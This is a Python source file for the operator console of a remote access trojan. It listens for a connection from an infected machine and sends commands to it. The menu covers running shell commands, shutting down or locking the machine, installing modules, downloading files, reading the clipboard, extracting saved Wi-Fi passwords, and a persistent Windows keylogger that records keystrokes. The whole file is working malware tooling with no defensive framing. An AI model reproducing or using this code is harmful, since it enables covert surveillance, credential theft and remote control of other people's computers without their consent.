import socket
import subprocess
import sys
import re
import colorama
import json


def imports():
    try:
        import pyttsx3
    except ModuleNotFoundError:
        alr = subprocess.check_output("pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pyttsx3
imports()



class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'

logsuc = "[+] Login Successful"
logfail = "Incorrect"
wallow = 0 # Will change to 1 if error occurs
readallow = 0
os = ""

privateIP = socket.gethostbyname(socket.gethostname())
host = str(privateIP)
p = input("Enter Port: ")

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((host, int(p)))
print(bcolors.GREEN + ' #### Listening on port ' + p + '... ' + '####')
listener.listen(0)
conn, addr = listener.accept()
print("[+] Connection established")

def login():
    global os
    while True:
        passwd = input("Login: ")
        conn.send(str.encode(passwd))
        lr = str(conn.recv(1024), "utf-8")
        if lr == logsuc:
            print(bcolors.GREEN +
                  '\n\n\n\t\t\t|#############################################|\n'
                  '\t\t\t|        ______________________________       |\n'                                              
                  '\t\t\t|        \______   \  /  _  \__    ___/       |\n'
                  '\t\t\t|          |       _/ /  /_\  \|    |         |\n'                
                  '\t\t\t|          |    |   \/    |    \    |         |\n'                                
                  '\t\t\t|          |____|_  /\____|__  /____|         |\n'  
                  '\t\t\t|                 \/         \/               |\n'                                          
                  '\t\t\t|#############################################|\n\n')




            print(bcolors.GREEN + logsuc)
            print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
            client_info = json.loads(str(conn.recv(1024), "utf-8"))
            client_username = client_info[1]
            os = client_info[0]
            client_ip = client_info[2]
            if "win" in os:
                os = "WINDOWS MACHINE"
            elif "mac" in os:
                os = "MAC MACHINE"
            elif "lin" in os:
                os = "LINUX MACHINE"
            elif "ub" in os:
                os = "UBUNTU MACHINE"
            print(bcolors.RED + "########## WARNING!!!! THIS RAT IS MADE FOR MAINLY WINDOWS SO SOME OF THE CUSTOM COMMANDS MAY NOT WORK ON OTHER OS ##########")
            print(bcolors.YELLOW + "----------------------------------------------------------------------------------------------------------------------")
            print(bcolors.RED + "########## YOUR CLIENT IS USING A " + os + " SO MAKE SURE TO USE COMMANDS THAT WORK ON " + os + " ##########")
            print(bcolors.YELLOW + "\nThe username of the client computer is " + client_username + " and their public IP is " + client_ip)
            break
        elif lr != logsuc:
            print(bcolors.RED + logfail)

def help():
    print(bcolors.YELLOW + '\n\n[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
                           ' to see the clients public IP address\n[+] Type shutdown to shutdown client and type cshutdo'
                           'wn to cancel\n[+] Type wifi pass to get the wifi '
                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak\n[+] Type "lock" (without the quotes) to lock the users computer (They will still be able to unlock it by entering their password as normal)\n[+] Type "clipboard get" (without the quotes) to get the current clipboard of the client)\n\n-------------------------KEYLOGGER (ONLY FOR WINDOWS)------------------------\n[+] Type "keylogger start" (without quotes) to start a keylogger on the client computer\n\t\tIt will be executed on their PC everytime it starts up\n[+] Type "keylogger get" to get the captured keystrokes on the client computer\n[+] Type "keylogger end" to stop running the keylogger on the client computer\n"')



def send_commands():
    global bcolors, wallow
    while True:
        while True:
            cmd = input(bcolors.YELLOW + ">> ")
            lcmd = cmd.lower().strip()
            if cmd != "":
                break

        def download_files():
            conn.send(str.encode(lcmd))
            path = input("Please enter the EXACT file path of the file you would like to download from the client: ")
            conn.send(str.encode(path))
            file_content = str(conn.recv(1024), "utf-8")
            file_content = bytes(file_content, encoding='utf8')
            #############################################
            received_path = input(
                bcolors.GREEN + "File Received! " + "What would you like to name this file: ")
            with open(received_path, "wb") as file:
                file.write(file_content)
                file.close()

        if lcmd == "quit":
            quit()
        elif lcmd == "shutdown":
            cmd = "shutdown /s"
        elif lcmd == "cshutdown" or lcmd == "c shutdown":
            cmd = "shutdown /a"
        elif lcmd == "help":
            help()
        elif lcmd == "pipins":
            while True:
                module = input("What module would you like to install on the client machine? ")
                module = module.lower()
                if module == "quit":
                    quit()
                cmd = "pip install " + module
                break
        elif "speak " in lcmd:
            conn.send(str.encode(lcmd))
        elif lcmd == "wifipass" or lcmd == "wifi pass":
            ex = 0
            while True:
                conn.send(str.encode(lcmd))
                wpass = str(conn.recv(1024), "utf-8")
                if wpass == "something":
                    send_commands()
                if wpass != "None":
                    wpass_r = re.search("(?:='Key\sContent\s*:\s)(.*)", wpass)
                    new_wpass = wpass_r.group(1)
                    final_wpass = new_wpass.replace(r"\r'>", " ")
                    if ex == 0:
                        print(bcolors.GREEN + final_wpass + "Is most likely the password")
                        print(bcolors.YELLOW + "These are some other passwords that were found: ")
                        ex = 1
                    elif ex == 1:
                        print(bcolors.RED + final_wpass)
                        if wpass == "something":
                            wallow = 1
        elif lcmd.strip() == "lock":
            if "win" in os.lower():
                cmd = 'Rundll32.exe user32.dll,LockWorkStation'
            elif "mac" in os.lower():
                cmd = 'pmset displaysleepnow'
            else:
                print("Please note that this command has only been tested for windows and mac os")
                cmd = 'pmset displaysleepnow'
        elif lcmd == "clipboard get":
            conn.send(str.encode(lcmd))
            clipboard = conn.recv(1024).decode("unicode_escape")[2:-1]
            print(clipboard)
        elif lcmd == "keylogger start":
            conn.send(str.encode(lcmd))
            keylogger_start_response = str(conn.recv(1024), "utf-8")
            if keylogger_start_response == "exists":
                print(bcolors.RED + '[-] Keylogger already exsists. Type "keylogger reset" to restart the keylogger log')
            else:
                print(bcolors.GREEN + "[+] Keylogger has been created!\n")
        elif lcmd == "keylogger get":
            conn.send(str.encode(lcmd))
            keylogger_get_response = str(conn.recv(1024), "utf-8")
            print(keylogger_get_response)
            if keylogger_get_response == "nan":
                print(bcolors.RED + '[-] Keylogger does not exsists. Type "keylogger start" to start a keylogger')
            else:
                # file_content = bytes(file_content, encoding='utf8')
                with open("logs.txt", "w") as e:
                    e.write(keylogger_get_response)
                    e.close()
                print(bcolors.GREEN + "\n[+] Log has been recieved!\n")
        elif lcmd == "keylogger end":
            conn.send(str.encode(lcmd))
            keylogger_end_response = str(conn.recv(1024), "utf-8")
            if keylogger_end_response == "nan":
                print(bcolors.RED + '[-] Keylogger does not exsist')
            else:
                print(bcolors.GREEN + "[+] Keylogger has been terminated!\n")
        if lcmd != "help" and "speak " not in lcmd and wallow == 0 and lcmd != "clipboard get" and lcmd != "keylogger get" and lcmd != "keylogger start" and lcmd != "keylogger end" and lcmd != "keylogger reset":
            if lcmd == "download":
                download_files()

            conn.send(str.encode(cmd))
            cmd_response = str(conn.recv(1024), "utf-8")
            print(bcolors.BLUE + cmd_response)
login()
send_commands()